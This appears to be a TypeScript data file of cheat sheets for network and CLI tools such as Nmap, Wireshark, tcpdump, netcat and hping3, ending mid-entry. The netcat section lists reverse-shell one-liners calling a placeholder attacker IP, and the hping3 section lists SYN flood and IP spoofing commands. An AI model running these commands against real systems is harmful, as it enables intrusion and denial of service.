
import { CheatSheetData } from './types';

export const cheatSheets: Record<string, CheatSheetData> = {
  netbios: {
    title: "NetBIOS Cheat Sheet",
    description: "Complete Technical Reference for NetBIOS (Network Basic Input/Output System).",
    sections: [
      {
        title: "1. NetBIOS Core Purpose",
        content: [
          { type: 'text', value: '**What NetBIOS Does:**' },
          { type: 'text', value: 'NetBIOS is a legacy Windows API providing three distinct services:' },
          { 
            type: 'code', 
            label: 'Core Services',
            value: '• NAME RESOLUTION: "Computer Name" -> IP Address (local network)\n• NETWORK BROWSING: Finding computers in "Network Neighborhood"\n• SESSION ESTABLISHMENT: Setting up connections between applications' 
          }
        ]
      },
      {
        title: "2. NBTSTAT Commands",
        content: [
          { type: 'text', value: 'The `nbtstat` utility is built into Windows for troubleshooting NetBIOS over TCP/IP.' },
          { type: 'code', value: 'nbtstat -n', label: 'List Local NetBIOS Names' },
          { type: 'code', value: 'nbtstat -A [IP Address]', label: 'Get Remote Table (by IP)' },
          { type: 'code', value: 'nbtstat -a [NetBIOS Name]', label: 'Get Remote Table (by Name)' },
          { type: 'code', value: 'nbtstat -c', label: 'List Cache' },
          { type: 'code', value: 'nbtstat -R', label: 'Purge and Reload Cache' },
          { type: 'code', value: 'nbtstat -RR', label: 'Release and Refresh WINS' }
        ]
      },
      {
        title: "3. Common NetBIOS Suffixes",
        content: [
          { type: 'text', value: 'The 16th byte of a NetBIOS name indicates the service type.' },
          {
            type: 'table',
            headers: ['Suffix (Hex)', 'Service Type', 'Description'],
            rows: [
              ['**00**', 'Workstation', 'Hostname / Workstation Service'],
              ['**20**', 'Server', 'File Sharing / Server Service'],
              ['**1B**', 'Domain Master Browser', 'Primary Domain Controller'],
              ['**1C**', 'Domain Controller', 'Active Directory'],
              ['**1E**', 'Browser Service', 'Network Election participation'],
              ['**03**', 'Messenger', 'Messenger Service (Legacy)']
            ]
          }
        ]
      },
      {
        title: "4. Enumeration Tools (Linux)",
        content: [
          { type: 'text', value: 'Tools commonly used in Penetration Testing and Auditing.' },
          { type: 'code', value: 'nbtscan -r 192.168.1.0/24', label: 'Scan Subnet with nbtscan' },
          { type: 'code', value: 'enum4linux -a [IP]', label: 'Enumerate User/Shares' },
          { type: 'code', value: 'nmap -sU --script nbstat.nse -p 137 [target]', label: 'Nmap NetBIOS Script' }
        ]
      }
    ]
  },
  jq: {
    title: "JQ Cheat Sheet",
    description: "A lightweight and flexible command-line JSON processor.",
    sections: [
      {
        title: "Basic Filters",
        content: [
          { type: 'text', value: "The simplest filter is `.`, which is the identity filter, copying JQ's input to its output unmodified." },
          { type: 'code', value: "echo '{\"foo\": \"bar\"}' | jq .", label: "Pretty Print JSON" },
          { type: 'code', value: "jq .foo", label: "Access Key" },
          { type: 'code', value: "jq .[0]", label: "Access Array Index" },
          { type: 'code', value: "jq .foo.bar", label: "Chained Access" }
        ]
      },
      {
        title: "Working with Arrays",
        content: [
          { type: 'code', value: "jq .[]", label: "Iterate over Array/Object values" },
          { type: 'code', value: "jq '.[0:2]'", label: "Slice Array" },
          { type: 'code', value: "jq 'map(.foo)'", label: "Map values" },
          { type: 'code', value: "jq 'map(select(.id > 2))'", label: "Select/Filter" }
        ]
      },
      {
        title: "Constructing JSON",
        content: [
          { type: 'code', value: "jq '{user: .name, title: .position}'", label: "Create new Object" },
          { type: 'code', value: "jq '[.name, .position]'", label: "Create new Array" }
        ]
      },
      {
        title: "Common Operators",
        content: [
          {
            type: 'table',
            headers: ['Operator', 'Description'],
            rows: [
              ['**|**', 'Pipe output of one filter to the next'],
              ['**,**', 'Output multiple results'],
              ['**+**', 'Add numbers or append arrays/strings'],
              ['**-**', 'Subtract numbers'],
              ['**length**', 'Get length of string/array'],
              ['**keys**', 'Get keys of object']
            ]
          }
        ]
      }
    ]
  },
  markdown: {
    title: "Markdown Cheat Sheet",
    description: "Syntax guide for the lightweight markup language.",
    sections: [
      {
        title: "Basic Syntax",
        content: [
          { type: 'text', value: "Markdown allows you to write using an easy-to-read, easy-to-write plain text format." },
          {
            type: 'table',
            headers: ['Element', 'Syntax', 'Result'],
            rows: [
              ['**Bold**', '`**text**`', '**text**'],
              ['**Italic**', '`*text*`', 'text (italic)'],
              ['**Strikethrough**', '`~~text~~`', 'text (crossed)'],
              ['**Heading 1**', '`# Text`', 'Large Heading'],
              ['**Heading 2**', '`## Text`', 'Medium Heading'],
              ['**Link**', '`[title](https://...)`', 'Link']
            ]
          }
        ]
      },
      {
        title: "Code",
        content: [
          { type: 'text', value: "You can format code inline or as blocks." },
          { type: 'code', value: '`inline code`', label: "Inline Code" },
          { type: 'code', value: '```\nblock code\n```', label: "Block Code" },
          { type: 'code', value: '```json\n{"key": "value"}\n```', label: "Syntax Highlighting" }
        ]
      },
      {
        title: "Lists",
        content: [
          {
            type: 'table',
            headers: ['List Type', 'Syntax'],
            rows: [
              ['**Unordered**', '`- Item` or `* Item`'],
              ['**Ordered**', '`1. Item`'],
              ['**Task List**', '`- [x] Task`']
            ]
          }
        ]
      },
      {
        title: "Blockquotes",
        content: [
          { type: 'text', value: "Use the `>` character for blockquotes." },
          { type: 'code', value: '> This is a quote.', label: "Blockquote" }
        ]
      }
    ]
  },
  nmap: {
    title: "Nmap Cheat Sheet",
    description: "Reference guide for scanning networks with Nmap.",
    sections: [
      {
        title: "What is Nmap?",
        content: [
          { type: 'text', value: 'Nmap ("Network Mapper") is a free and open source utility for network discovery and security auditing. Many systems and network administrators also find it useful for tasks such as network inventory, managing service upgrade schedules, and monitoring host or service uptime. Nmap uses raw IP packets in novel ways to determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running. It was designed to rapidly scan large networks, but works fine against single hosts.' }
        ]
      },
      {
        title: "How to Use Nmap",
        content: [
          { type: 'text', value: "Nmap can be used in a variety of ways depending on the user's level of technical expertise." },
          {
            type: 'table',
            headers: ['Technical Expertise', 'Usage'],
            rows: [
              ['Beginner', 'Zenmap the graphical user interface for Nmap'],
              ['Intermediate', 'Command line'],
              ['Advanced', 'Python scripting with the Python-Nmap package']
            ]
          },
          { type: 'code', value: 'nmap [ <Scan Type> ...] [ <Options> ] { <target specification> }', label: 'Command Line Structure' }
        ]
      },
      {
        title: "Basic Scanning Techniques",
        content: [
          { type: 'text', value: "The `-s` switch determines the type of scan to perform." },
          {
            type: 'table',
            headers: ['Nmap Switch', 'Description'],
            rows: [
              ['**-sA**', 'ACK scan'],
              ['**-sF**', 'FIN scan'],
              ['**-sI**', 'IDLE scan'],
              ['**-sL**', 'DNS scan (a.k.a. list scan)'],
              ['**-sN**', 'NULL scan'],
              ['**-sO**', 'Protocol scan'],
              ['**-sP**', 'Ping scan'],
              ['**-sR**', 'RPC scan'],
              ['**-sS**', 'SYN scan'],
              ['**-sT**', 'TCP connect scan'],
              ['**-sW**', 'Windows scan'],
              ['**-sX**', 'XMAS scan'],
            ]
          },
          { type: 'code', value: 'nmap [target]', label: 'Scan a Single Target' },
          { type: 'code', value: 'nmap [target1, target2, etc]', label: 'Scan Multiple Targets' },
          { type: 'code', value: 'nmap -iL [list.txt]', label: 'Scan a List of Targets' },
          { type: 'code', value: 'nmap [range of IP addresses]', label: 'Scan a Range of Hosts' },
          { type: 'code', value: 'nmap [ip address/cdir]', label: 'Scan an Entire Subnet' },
          { type: 'code', value: 'nmap -iR [number]', label: 'Scan Random Hosts' },
          { type: 'code', value: 'nmap [targets] --exclude [targets]', label: 'Exclude Targets From a Scan' },
          { type: 'code', value: 'nmap [targets] --excludefile [list.txt]', label: 'Exclude Targets Using a List' },
          { type: 'code', value: 'nmap -A [target]', label: 'Perform an Aggressive Scan' },
          { type: 'code', value: 'nmap -6 [target]', label: 'Scan an IPv6 Target' },
        ]
      },
      {
        title: "Port Scanning Options",
        content: [
          { type: 'code', value: 'nmap -F [target]', label: 'Perform a Fast Scan' },
          { type: 'code', value: 'nmap -p [port(s)] [target]', label: 'Scan Specific Ports' },
          { type: 'code', value: 'nmap -p [port name(s)] [target]', label: 'Scan Ports by Name' },
          { type: 'code', value: 'nmap -sU -sT -p U:[ports],T:[ports] [target]', label: 'Scan Ports by Protocol' },
          { type: 'code', value: 'nmap -p 1-65535 [target]', label: 'Scan All Ports' },
          { type: 'code', value: 'nmap --top-ports [number] [target]', label: 'Scan Top Ports' },
          { type: 'code', value: 'nmap -r [target]', label: 'Perform a Sequential Port Scan' },
        ]
      },
      {
        title: "Service/Version & OS Detection",
        content: [
           {
            type: 'table',
            headers: ['Nmap Switch', 'Description'],
            rows: [
              ['**-sV**', 'Enumerates software versions'],
              ['**-O**', 'Operating System detection'],
              ['**--osscan-guess**', 'Guess unknown OS'],
            ]
          },
          { type: 'code', value: 'nmap -O --osscan-guess [target]', label: 'Attempt to Guess an Unknown OS' },
          { type: 'code', value: 'nmap -sV [target]', label: 'Service Version Detection' },
          { type: 'code', value: 'nmap -sV --version-trace [target]', label: 'Troubleshoot Version Scan' },
          { type: 'code', value: 'nmap -sR [target]', label: 'Perform a RPC Scan' },
        ]
      },
      {
        title: "Discovery Options",
        content: [
          { type: 'text', value: 'Host Discovery. The `-p` switch determines the type of ping to perform.' },
          {
            type: 'table',
            headers: ['Nmap Switch', 'Description'],
            rows: [
              ['**-PI**', 'ICMP ping'],
              ['**-Po**', 'No ping'],
              ['**-PS**', 'SYN ping'],
              ['**-PT**', 'TCP ping'],
            ]
          },
          { type: 'code', value: 'nmap -sn [target]', label: 'Perform a Ping Only Scan' },
          { type: 'code', value: 'nmap -Pn [target]', label: 'Do Not Ping' },
          { type: 'code', value: 'nmap -PS [target]', label: 'TCP SYN Ping' },
          { type: 'code', value: 'nmap -PA [target]', label: 'TCP ACK Ping' },
          { type: 'code', value: 'nmap -PU [target]', label: 'UDP Ping' },
          { type: 'code', value: 'nmap -PY [target]', label: 'SCTP INIT Ping' },
          { type: 'code', value: 'nmap -PE [target]', label: 'ICMP Echo Ping' },
          { type: 'code', value: 'nmap -PP [target]', label: 'ICMP Timestamp Ping' },
          { type: 'code', value: 'nmap -PM [target]', label: 'ICMP Address Mask Ping' },
          { type: 'code', value: 'nmap -PO [target]', label: 'IP Protocol Ping' },
          { type: 'code', value: 'nmap -PR [target]', label: 'ARP ping' },
          { type: 'code', value: 'nmap --traceroute [target]', label: 'Traceroute' },
          { type: 'code', value: 'nmap -R [target]', label: 'Force Reverse DNS Resolution' },
          { type: 'code', value: 'nmap -n [target]', label: 'Disable Reverse DNS Resolution' },
          { type: 'code', value: 'nmap --system-dns [target]', label: 'Alternative DNS Lookup' },
          { type: 'code', value: 'nmap --dns-servers [servers] [target]', label: 'Manually Specify DNS Server' },
          { type: 'code', value: 'nmap -sL [targets]', label: 'Create a Host List' },
        ]
      },
      {
        title: "Port Specification & Scan Order",
        content: [
          {
            type: 'table',
            headers: ['Nmap Switch', 'Description'],
            rows: [
              ['**-p <range>**', 'Scan specified ports'],
              ['**-p-**', 'Scan all 65535 ports'],
              ['**-F**', 'Fast mode - Scan fewer ports than the default scan'],
              ['**-r**', 'Scan ports consecutively - don\'t randomize'],
              ['**--top-ports <number>**', 'Scan <number> most common ports'],
            ]
          }
        ]
      },
      {
        title: "Script Scan",
        content: [
           {
            type: 'table',
            headers: ['Nmap Switch', 'Description'],
            rows: [
              ['**-sC**', 'Run all default scripts'],
            ]
          },
          { type: 'code', value: 'nmap --script [script.nse] [target]', label: 'Execute Individual Scripts' },
          { type: 'code', value: 'nmap --script [expression] [target]', label: 'Execute Multiple Scripts' },
          { type: 'code', value: 'nmap --script [category] [target]', label: 'Execute Scripts by Category' },
          { type: 'code', value: 'nmap --script [category1,category2,etc]', label: 'Execute Multiple Script Categories' },
          { type: 'code', value: 'nmap --script [script] --script-trace [target]', label: 'Troubleshoot Scripts' },
          { type: 'code', value: 'nmap --script-updatedb', label: 'Update the Script Database' },
        ]
      },
      {
        title: "Timing and Performance",
        content: [
          { type: 'text', value: "The `-t` switch determines the speed and stealth performed. Not specifying a `T` value will default to `-T3`, or normal speed." },
          {
            type: 'table',
            headers: ['Nmap Switch', 'Description'],
            rows: [
              ['**-T0**', 'Serial, slowest scan'],
              ['**-T1**', 'Serial, slow scan'],
              ['**-T2**', 'Serial, normal speed scan'],
              ['**-T3**', 'Parallel, normal speed scan'],
              ['**-T4**', 'Parallel, fast scan'],
            ]
          },
           { type: 'code', value: 'nmap -T[0-5] [target]', label: 'Timing Templates' },
           { type: 'code', value: 'nmap --ttl [time] [target]', label: 'Set the Packet TTL' },
           { type: 'code', value: 'nmap --min-parallelism [number] [target]', label: 'Minimum Number of Parallel Operations' },
           { type: 'code', value: 'nmap --max-parallelism [number] [target]', label: 'Maximum Number of Parallel Operations' },
           { type: 'code', value: 'nmap --min-hostgroup [number] [targets]', label: 'Minimum Host Group Size' },
           { type: 'code', value: 'nmap --max-hostgroup [number] [targets]', label: 'Maximum Host Group Size' },
           { type: 'code', value: 'nmap --initial-rtt-timeout [time] [target]', label: 'Initial RTT Timeout' },
           { type: 'code', value: 'nmap --max-rtt-timeout [TTL] [target]', label: 'Maximum RTT Timeout' },
           { type: 'code', value: 'nmap --max-retries [number] [target]', label: 'Maximum Number of Retries' },
           { type: 'code', value: 'nmap --host-timeout [time] [target]', label: 'Host Timeout' },
           { type: 'code', value: 'nmap --scan-delay [time] [target]', label: 'Minimum Scan Delay' },
           { type: 'code', value: 'nmap --max-scan-delay [time] [target]', label: 'Maximum Scan Delay' },
           { type: 'code', value: 'nmap --min-rate [number] [target]', label: 'Minimum Packet Rate' },
           { type: 'code', value: 'nmap --max-rate [number] [target]', label: 'Maximum Packet Rate' },
           { type: 'code', value: 'nmap --defeat-rst-ratelimit [target]', label: 'Defeat Reset Rate Limits' },
        ]
      },
      {
        title: "Firewall Evasion Techniques",
        content: [
          { type: 'code', value: 'nmap -f [target]', label: 'Fragment Packets' },
          { type: 'code', value: 'nmap --mtu [MTU] [target]', label: 'Specify a Specific MTU' },
          { type: 'code', value: 'nmap -D RND:[number] [target]', label: 'Use a Decoy' },
          { type: 'code', value: 'nmap -sI [zombie] [target]', label: 'Idle Zombie Scan' },
          { type: 'code', value: 'nmap --source-port [port] [target]', label: 'Manually Specify a Source Port' },
          { type: 'code', value: 'nmap --data-length [size] [target]', label: 'Append Random Data' },
          { type: 'code', value: 'nmap --randomize-hosts [target]', label: 'Randomize Target Scan Order' },
          { type: 'code', value: 'nmap --spoof-mac [MAC|0|vendor] [target]', label: 'Spoof MAC Address' },
          { type: 'code', value: 'nmap --badsum [target]', label: 'Send Bad Checksums' },
        ]
      },
      {
        title: "Advanced Scanning Functions",
        content: [
          { type: 'code', value: 'nmap -sS [target]', label: 'TCP SYN Scan' },
          { type: 'code', value: 'nmap -sT [target]', label: 'TCP Connect Scan' },
          { type: 'code', value: 'nmap -sU [target]', label: 'UDP Scan' },
          { type: 'code', value: 'nmap -sN [target]', label: 'TCP NULL Scan' },
          { type: 'code', value: 'nmap -sF [target]', label: 'TCP FIN Scan' },
          { type: 'code', value: 'nmap -sA [target]', label: 'TCP ACK Scan' },
          { type: 'code', value: 'nmap -sX [target]', label: 'Xmas Scan' },
          { type: 'code', value: 'nmap --scanflags [flags] [target]', label: 'Custom TCP Scan' },
          { type: 'code', value: 'nmap -sO [target]', label: 'IP Protocol Scan' },
          { type: 'code', value: 'nmap --send-eth [target]', label: 'Send Raw Ethernet Packets' },
          { type: 'code', value: 'nmap --send-ip [target]', label: 'Send IP Packets' },
        ]
      },
      {
        title: "Output Options",
        content: [
          {
            type: 'table',
            headers: ['Nmap Switch', 'Description'],
            rows: [
              ['**-oN**', 'Normal output'],
              ['**-oX**', 'XML output'],
              ['**-oA**', 'Normal, XML, and Grepable format all at once'],
            ]
          },
          { type: 'code', value: 'nmap -oN [scan.txt] [target]', label: 'Save Output to a Text File' },
          { type: 'code', value: 'nmap -oX [scan.xml] [target]', label: 'Save Output to a XML File' },
          { type: 'code', value: 'nmap -oG [scan.txt] [target]', label: 'Grepable Output' },
          { type: 'code', value: 'nmap -oA [path/filename] [target]', label: 'Output All Supported File Types' },
          { type: 'code', value: 'nmap --stats-every [time] [target]', label: 'Periodically Display Statistics' },
          { type: 'code', value: 'nmap -oS [scan.txt] [target]', label: '1337 Output' },
        ]
      },
      {
        title: "Compare Scans",
        content: [
          { type: 'code', value: 'ndiff [scan1.xml] [scan2.xml]', label: 'Comparison Using Ndiff' },
          { type: 'code', value: 'ndiff -v [scan1.xml] [scan2.xml]', label: 'Ndiff Verbose Mode' },
          { type: 'code', value: 'ndiff --xml [scan1.xml] [scan2.xml]', label: 'XML Output Mode' },
        ]
      },
      {
        title: "Troubleshooting and Debugging",
        content: [
          { type: 'code', value: 'nmap -h', label: 'Get Help' },
          { type: 'code', value: 'nmap -V', label: 'Display Nmap Version' },
          { type: 'code', value: 'nmap -v [target]', label: 'Verbose Output' },
          { type: 'code', value: 'nmap -d [target]', label: 'Debugging' },
          { type: 'code', value: 'nmap --reason [target]', label: 'Display Port State Reason' },
          { type: 'code', value: 'nmap --open [target]', label: 'Only Display Open Ports' },
          { type: 'code', value: 'nmap --packet-trace [target]', label: 'Trace Packets' },
          { type: 'code', value: 'nmap --iflist', label: 'Display Host Networking' },
          { type: 'code', value: 'nmap -e [interface] [target]', label: 'Specify a Network Interface' },
        ]
      },
      {
        title: "Reference Sites",
        content: [
          {
            type: 'links',
            links: [
              { text: "Nmap - The Basics (YouTube)", url: "https://www.youtube.com/watch?v=_JvtO-oe8k8" },
              { text: "Nmap Cheat Sheet Guide", url: "https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/" },
              { text: "Beginner's Guide to Nmap", url: "https://www.linux.com/learn/beginners-guide-nmap" },
              { text: "Top 32 Nmap Command", url: "https://www.cyberciti.biz/security/nmap-command-examples-tutorials/" },
              { text: "Nmap Linux man page", url: "https://linux.die.net/man/1/nmap" },
              { text: "29 Practical Examples of Nmap", url: "https://www.tecmint.com/nmap-command-examples/" },
              { text: "Nmap Cheat Sheet (HighOnCoffee)", url: "https://highon.coffee/blog/nmap-cheat-sheet/" },
              { text: "StationX Nmap Cheat Sheet", url: "https://www.stationx.net/nmap-cheat-sheet/" }
            ]
          }
        ]
      }
    ]
  },
  ntopng: {
    title: "Ntopng Cheat Sheet",
    description: "Web-based high-speed traffic analysis and flow collection.",
    sections: [
      {
        title: "Installation & Startup",
        content: [
          { type: 'text', value: "Ntopng is usually run as a service, but can be invoked via CLI for debugging." },
          { type: 'code', value: 'sudo systemctl start ntopng', label: 'Start Service' },
          { type: 'code', value: 'ntopng /etc/ntopng/ntopng.conf', label: 'Start with Config' },
          { type: 'code', value: 'ntopng -i eth0', label: 'Monitor Specific Interface' },
        ]
      },
      {
        title: "Configuration Options",
        content: [
          {
            type: 'table',
            headers: ['Flag', 'Description'],
            rows: [
              ['**-i**', 'Interface to monitor'],
              ['**-w**', 'HTTP Port (Default: 3000)'],
              ['**-W**', 'HTTPS Port'],
              ['**-m**', 'Local Subnets (e.g., 192.168.1.0/24)'],
              ['**-d**', 'Data Directory'],
              ['**-n**', 'DNS Mode (0=Decode, 1=Numeric, etc.)']
            ]
          }
        ]
      },
      {
        title: "Interface Navigation",
        content: [
          { type: 'text', value: "Access the GUI at `http://localhost:3000` (Default login: admin/admin)." },
          { type: 'note', value: "Check 'Flows' for real-time connections, 'Hosts' for device stats, and 'Interfaces' for throughput." }
        ]
      }
    ]
  },
  wireshark: {
    title: "Wireshark Cheat Sheet",
    description: "Essential display filters and shortcuts for packet analysis.",
    sections: [
      {
        title: "Common Display Filters",
        content: [
          { type: 'text', value: "Apply these in the filter bar at the top of the GUI." },
          { type: 'code', value: 'ip.addr == 192.168.1.1', label: 'Filter by IP' },
          { type: 'code', value: 'ip.src == 192.168.1.5', label: 'Filter by Source' },
          { type: 'code', value: 'ip.dst == 192.168.1.1', label: 'Filter by Destination' },
          { type: 'code', value: 'tcp.port == 80', label: 'Filter by TCP Port' },
          { type: 'code', value: 'udp.port == 53', label: 'Filter by UDP Port' },
          { type: 'code', value: 'http or dns', label: 'Combine Protocols' },
        ]
      },
      {
        title: "Protocol Specific Filters",
        content: [
          { type: 'code', value: 'http.request.method == "POST"', label: 'HTTP POST Requests' },
          { type: 'code', value: 'http.response.code == 404', label: 'HTTP 404 Errors' },
          { type: 'code', value: 'dns.qry.name contains "google"', label: 'DNS Query Matching' },
          { type: 'code', value: 'tcp.analysis.flags', label: 'TCP Problems (Retransmissions)' },
        ]
      },
      {
        title: "Logical Operators",
        content: [
          {
            type: 'table',
            headers: ['Operator', 'Alternative', 'Example'],
            rows: [
              ['**==**', 'eq', 'ip.src == 10.0.0.1'],
              ['**!=**', 'ne', 'tcp.port != 80'],
              ['**>**', 'gt', 'frame.len > 128'],
              ['**&&**', 'and', 'http && ip.src == 10.0.0.1'],
              ['**||**', 'or', 'http || dns'],
              ['**!**', 'not', '!arp']
            ]
          }
        ]
      },
      {
        title: "Command Line (TShark)",
        content: [
          { type: 'code', value: 'tshark -i eth0', label: 'Capture on Interface' },
          { type: 'code', value: 'tshark -r capture.pcap', label: 'Read File' },
          { type: 'code', value: 'tshark -Y "http.request"', label: 'Apply Display Filter' },
        ]
      }
    ]
  },
  tcpdump: {
    title: "tcpdump Cheat Sheet",
    description: "Packet analyzer for the command line.",
    sections: [
      {
        title: "Basic Capture",
        content: [
          { type: 'code', value: 'tcpdump -i eth0', label: 'Capture on Interface' },
          { type: 'code', value: 'tcpdump -i any', label: 'Capture on All Interfaces' },
          { type: 'code', value: 'tcpdump -c 10', label: 'Capture 10 Packets and Exit' },
          { type: 'code', value: 'tcpdump -v', label: 'Verbose Output' },
          { type: 'code', value: 'tcpdump -vv', label: 'Very Verbose' },
        ]
      },
      {
        title: "Filtering Host & Port",
        content: [
          { type: 'code', value: 'tcpdump host 192.168.1.1', label: 'Filter by Host' },
          { type: 'code', value: 'tcpdump src 192.168.1.1', label: 'Filter by Source' },
          { type: 'code', value: 'tcpdump dst 192.168.1.1', label: 'Filter by Destination' },
          { type: 'code', value: 'tcpdump port 80', label: 'Filter by Port' },
          { type: 'code', value: 'tcpdump portrange 21-23', label: 'Filter Port Range' },
        ]
      },
      {
        title: "Protocol Filters",
        content: [
          { type: 'code', value: 'tcpdump icmp', label: 'Capture ICMP' },
          { type: 'code', value: 'tcpdump tcp', label: 'Capture TCP' },
          { type: 'code', value: 'tcpdump udp', label: 'Capture UDP' },
          { type: 'code', value: 'tcpdump arp', label: 'Capture ARP' },
        ]
      },
      {
        title: "Complex Logic",
        content: [
          { type: 'code', value: 'tcpdump "src 10.1.1.1 and port 80"', label: 'And Operator' },
          { type: 'code', value: 'tcpdump "port 80 or port 443"', label: 'Or Operator' },
          { type: 'code', value: 'tcpdump "not arp"', label: 'Not Operator' },
        ]
      },
      {
        title: "File Operations",
        content: [
          { type: 'code', value: 'tcpdump -w capture.pcap', label: 'Write to File' },
          { type: 'code', value: 'tcpdump -r capture.pcap', label: 'Read from File' },
        ]
      },
      {
        title: "Display Formats",
        content: [
          { type: 'code', value: 'tcpdump -A', label: 'Print ASCII (Good for HTTP)' },
          { type: 'code', value: 'tcpdump -X', label: 'Print Hex and ASCII' },
          { type: 'code', value: 'tcpdump -e', label: 'Print Link-Level Header' },
          { type: 'code', value: 'tcpdump -n', label: 'No DNS Resolution (Faster)' },
        ]
      }
    ]
  },
  masscan: {
    title: "Masscan Cheat Sheet",
    description: "Mass IP port scanner, designed to scan the entire internet in under 6 minutes.",
    sections: [
      {
        title: "Basic Usage",
        content: [
          { type: 'note', value: "Masscan uses its own TCP/IP stack. It needs `--rate` to be effective." },
          { type: 'code', value: 'masscan -p80 192.168.1.0/24', label: 'Scan Subnet for Port 80' },
          { type: 'code', value: 'masscan -p80,8000-8100 10.0.0.0/8', label: 'Scan Port Ranges' },
        ]
      },
      {
        title: "Rate Limiting",
        content: [
          { type: 'code', value: 'masscan -p80 0.0.0.0/0 --rate 100000', label: 'Scan Internet at 100kpps' },
          { type: 'text', value: "Be careful with high rates; you can crash local routers." }
        ]
      },
      {
        title: "Output",
        content: [
          { type: 'code', value: 'masscan -p80 10.0.0.0/8 -oX results.xml', label: 'XML Output' },
          { type: 'code', value: 'masscan -p80 10.0.0.0/8 -oJ results.json', label: 'JSON Output' },
          { type: 'code', value: 'masscan -p80 10.0.0.0/8 -oL results.txt', label: 'List Output' },
        ]
      },
      {
        title: "Configuration",
        content: [
          { type: 'code', value: 'masscan --adapter-ip 192.168.1.100', label: 'Spoof Source IP' },
          { type: 'code', value: 'masscan --adapter-mac 00:11:22:33:44:55', label: 'Spoof Source MAC' },
          { type: 'code', value: 'masscan -c masscan.conf', label: 'Load Config File' },
        ]
      }
    ]
  },
  netcat: {
    title: "Netcat (nc) Cheat Sheet",
    description: "The swiss-army knife of networking. Read and write data across network connections.",
    sections: [
      {
        title: "Client Mode",
        content: [
          { type: 'code', value: 'nc [target] [port]', label: 'Connect to Port' },
          { type: 'code', value: 'nc -v [target] [port]', label: 'Verbose Connection' },
          { type: 'code', value: 'nc -u [target] [port]', label: 'UDP Connection' },
        ]
      },
      {
        title: "Server (Listener) Mode",
        content: [
          { type: 'code', value: 'nc -l -p [port]', label: 'Listen on Port' },
          { type: 'code', value: 'nc -lvnp [port]', label: 'Listen Verbose, No DNS, Numeric' },
        ]
      },
      {
        title: "File Transfer",
        content: [
          { type: 'text', value: "Receiver:" },
          { type: 'code', value: 'nc -lvnp 1234 > output_file' },
          { type: 'text', value: "Sender:" },
          { type: 'code', value: 'nc [receiver_ip] 1234 < input_file' },
        ]
      },
      {
        title: "Port Scanning",
        content: [
          { type: 'code', value: 'nc -z -v [target] 20-80', label: 'Scan Ports 20-80' },
          { type: 'code', value: 'nc -z -u -v [target] 20-80', label: 'UDP Port Scan' },
        ]
      },
      {
        title: "Reverse Shells (Educational Use Only)",
        content: [
          { type: 'code', value: 'nc -e /bin/bash [attacker_ip] [port]', label: 'Linux Reverse Shell (GAPING_SECURITY_HOLE)' },
          { type: 'code', value: 'nc -e cmd.exe [attacker_ip] [port]', label: 'Windows Reverse Shell' },
          { type: 'code', value: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip] [port] >/tmp/f', label: 'No -e Flag Shell' },
        ]
      }
    ]
  },
  zmap: {
    title: "ZMap Cheat Sheet",
    description: "Fast single-packet network scanner for internet-wide surveys.",
    sections: [
      {
        title: "Basic Usage",
        content: [
          { type: 'code', value: 'zmap -p 80', label: 'Scan Internet for Port 80' },
          { type: 'code', value: 'zmap -p 80 10.0.0.0/8', label: 'Scan Specific Subnet' },
        ]
      },
      {
        title: "Output",
        content: [
          { type: 'code', value: 'zmap -p 80 -o results.csv', label: 'Output to CSV' },
          { type: 'code', value: 'zmap -p 80 --output-fields=ip,saddr', label: 'Specify Fields' },
        ]
      },
      {
        title: "Performance",
        content: [
          { type: 'code', value: 'zmap -B 10M', label: 'Set Bandwidth Limit (10Mbps)' },
          { type: 'code', value: 'zmap -r 10000', label: 'Set Packet Rate (pps)' },
        ]
      },
      {
        title: "Probes",
        content: [
          { type: 'code', value: 'zmap --probe-module=icmp_echoscan', label: 'ICMP Scan' },
          { type: 'code', value: 'zmap --probe-module=udp_probe -p 53', label: 'UDP Scan' },
        ]
      }
    ]
  },
  hping3: {
    title: "hping3 Cheat Sheet",
    description: "Command-line TCP/IP packet assembler/analyzer.",
    sections: [
      {
        title: "Scanning Types",
        content: [
          { type: 'code', value: 'hping3 -S [target] -p 80', label: 'TCP SYN Scan' },
          { type: 'code', value: 'hping3 -A [target] -p 80', label: 'TCP ACK Scan' },
          { type: 'code', value: 'hping3 -F [target] -p 80', label: 'TCP FIN Scan' },
          { type: 'code', value: 'hping3 -1 [target]', label: 'ICMP Scan' },
          { type: 'code', value: 'hping3 -2 [target]', label: 'UDP Scan' },
        ]
      },
      {
        title: "Packet Crafting",
        content: [
          { type: 'code', value: 'hping3 --flood [target]', label: 'SYN Flood' },
          { type: 'code', value: 'hping3 -a [spoofed_ip] [target]', label: 'Spoof Source IP' },
          { type: 'code', value: 'hping3 --rand-source [target]', label: 'Random Source IP' },
          { type: 'code', value: 'hping3 --ttl 64 [target]', label: 'Set TTL' },
        ]
      },
      {
        title: "Traceroute",
        content: [
          { type: 'code', value: 'hping3 --traceroute -V -1 [target]', label: 'ICMP Traceroute' },
          { type: 'code', value: 'hping3 --traceroute -V -S -p 80 [target]', label: 'TCP Traceroute' },
        ]
      }
    ]
  },
  dig: {
    title: "dig Cheat Sheet",
    description: "Domain Information Groper for DNS interrogation.",
    sections: [
      {
        title: "Basic Queries",
        content: [
          { type: 'code', value: 'dig google.com', label: 'A Record (Default)' },
          { type: 'code', value: 'dig google.com MX', label: 'MX Records' },
          { type: 'code', value: 'dig google.com NS', label: 'NS Records' },
          { type: 'code', value: 'dig google.com ANY', label: 'All Records' },
        ]
      },
      {
        title: "Advanced Usage",
        content: [
          { type: 'code', value: 'dig @1.1.1.1 google.com', label: 'Query Specific Server' },
          { type: 'code', value: 'dig -x 8.8.8.8', label: 'Reverse Lookup' },
          { type: 'code', value: 'dig +short google.com', label: 'Short Output (IP only)' },
          { type: 'code', value: 'dig +trace google.com', label: 'Trace DNS Path' },
          { type: 'code', value: 'dig axfr zone.com @ns1.zone.com', label: 'Zone Transfer' },
        ]
      }
    ]
  },
  nslookup: {
    title: "nslookup Cheat Sheet",
    description: "Legacy tool for querying DNS name servers.",
    sections: [
      {
        title: "Interactive Mode",
        content: [
          { type: 'code', value: 'nslookup', label: 'Enter Interactive Mode' },
          { type: 'text', value: "Inside interactive mode:" },
          { type: 'code', value: 'server 8.8.8.8', label: 'Set DNS Server' },
          { type: 'code', value: 'set type=mx', label: 'Set Query Type' },
          { type: 'code', value: 'google.com', label: 'Query Domain' },
